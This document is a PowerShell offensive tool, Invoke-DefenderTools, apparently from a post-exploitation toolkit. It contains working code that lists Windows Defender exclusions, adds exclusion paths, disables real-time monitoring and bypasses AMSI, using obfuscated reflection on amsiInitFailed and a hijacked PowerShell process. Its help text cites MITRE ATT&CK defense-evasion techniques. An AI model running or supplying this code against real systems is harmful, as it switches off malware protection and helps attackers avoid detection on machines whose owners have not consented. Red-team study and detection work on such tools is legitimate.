function Invoke-DefenderTools {
<#
                                          
.SYNOPSIS
	Several functions to aid in interacting with Windows Defender.

.PARAMETER Help
	Shows detailed help for each function.

.PARAMETER List
	Shows summary list of available functions.

.PARAMETER GetExcludes
	Gets any current exclude files/paths/extensions currently configured in Windows Defender via the Registry. 

.PARAMETER AddExclude
	Adds a path exclude to Windows Defender. (Requires Elevation)    

.PARAMETER DisableRtm
	Description: Disables Windows Defender Real-Time Monitoring. (Requires Elevation)

.PARAMETER DisableAMSI
	Disables PowerShell's AMSI Hook

.EXAMPLE
	PS> Invoke-DefenderTools -GetExcludes

.EXAMPLE
	PS> Invoke-DefenderTools -AddExclude
	
.EXAMPLE
	PS> Invoke-DefenderTools -DisableRtm

.EXAMPLE
	PS> Invoke-DefenderTools -DisableAmsi
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>
[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$GetExcludes,
	
	[Parameter(Mandatory = $False)]
	[Switch]$AddExclude,
	[string]$Path,
	
	[Parameter(Mandatory = $False)]
	[Switch]$DisableRtm,
	
	[Parameter(Mandatory = $False)]
	[Switch]$DisableAmsi
)

$JobName = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-DefenderTools Help ###
 ---------------------------------
 Available Invoke-DefenderTools Commands:
 ----------------------------------------
 |----------------------------------------------------------------------|
 | -GetExcludes                                                         |
 |----------------------------------------------------------------------| 

   [*] Description: Gets any current exclude files/paths/extensions    
       currently configured in Windows Defender via the Registry.      

   [*] Usage: Invoke-DefenderTools -GetExcludes
   
   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)

 |----------------------------------------------------------------------|
 | -AddExclude [-Path] path                                             |
 |----------------------------------------------------------------------|

   [*] Description: Adds a path exclude to Windows Defender.
       (Requires Elevation)

   [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp
   
   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)

 |----------------------------------------------------------------------|
 | -DisableRTM                                                          |
 |----------------------------------------------------------------------|

   [*] Description: Disables Windows Defender Real-Time Monitoring.    
       (Requires Elevation)                                            

       Note: Will pop an alert to the end user.                        

   [*] Usage: Invoke-DefenderTools -DisableRtm 

   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)
   
 |----------------------------------------------------------------------|
 | -DisableAMSI                                                         |
 |----------------------------------------------------------------------|

   [*] Description: Disables PowerShell's AMSI Hook

   [*] Usage: Invoke-DefenderTools -DisableAmsi
   
   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)
 
 \----------------------------------------------------------------------/

"@
	}
	elseif ($List -eq $True) {
		Write @"

 Invoke-DefenderTools Brief Command Usage:
 -----------------------------------------
 Invoke-DefenderTools -GetExcludes
 Invoke-DefenderTools -AddExclude -Path C:\temp
 Invoke-DefenderTools -DisableRtm
 Invoke-DefenderTools -DisableAMSI
 
"@
	}
		
	elseif ($GetExcludes) {
		
		$h = "`n### Invoke-DefenderTools(GetExcludes) ###`n"
		$h
		Write "`nPATHS/FILE EXCLUSIONS"
		Write "---------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*:\*'){
				Write $_.Name
			}
		}
		Write "`nPROCESS EXCLUSIONS"
		Write "------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		Write "`nEXTENSION EXCLUSIONS"
		Write "--------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		$h
	}	
	elseif ($AddExclude -and $Path) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		
		$h = "`n### Invoke-DefenderTools(AddExclude) ###`n"
		
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h
			Add-MpPreference -ExclusionPath "$path"
			Write " [+] Added a Defender exclude path of '$path'!"
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to add a Defender exclude."
			$h
		}
	}
	elseif ($DisableRtm) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		
		$h = "`n### Invoke-DefenderTools(DisableRtm) ###`n"
		
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544"))) {
			$h
			Set-MpPreference -DisableRealTimeMonitoring $true
			Write " [+] Successfully disabled Defender's real-time monitoring."
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to disable Defender's Real-Time Monitoring."
			$h
		}
	}
	elseif ($DisableAmsi) {
	# Invoke-AMSI9000
	# https://github.com/securemode/Bypass-AMSI9000
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		
		$h = "`n### Invoke-DefenderTools(DisableAmsi) ###`n"

		if ($([bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').GetValue($null))))) {
			$h
			Write " [+] Amsi is already disabled."
			$h
		}
		else {
			
			Try {
				$h
				Start-Job -Name $JobName -ScriptBlock {(Start-Process -NoNewWindow powershell)} | Out-Null
		
				Write-Output "Working..."
				sleep 2
			}
			Catch {
				Write-Output "Unknown Error."
			}

			$Process = (Get-Process powershell).Id
			foreach ($i in $Process) {
	
				Try {
					Enter-PSHostProcess -Id $i
					Write-Output "`nSuccess. `nRemember to re-import Invoke-Apex to get all of its functionality within this current PowerShell context.`n"
					return
				}
				Catch {
					Write-Output "Bad PID...Trying again..."
					Sleep 2
				}
			}
		}
	}
}